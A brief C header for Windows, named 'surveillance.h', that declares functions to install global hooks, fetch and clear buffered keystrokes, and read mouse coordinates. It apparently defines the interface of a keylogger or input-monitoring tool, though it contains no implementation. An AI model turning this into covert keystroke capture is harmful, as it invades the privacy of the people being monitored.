#ifndef SURVEILLANCE_H
#define SURVEILLANCE_H

#include <windows.h>
#include <stdio.h>

// Initialize the global hooks
void init_global_hooks(void);

// Fetch the currently buffered keystrokes (and clears the buffer)
void get_buffered_keys(char* out_buffer, int max_len);

// Fetch the most recent mouse coordinates
void get_mouse_coordinates(int* x, int* y);

#endif
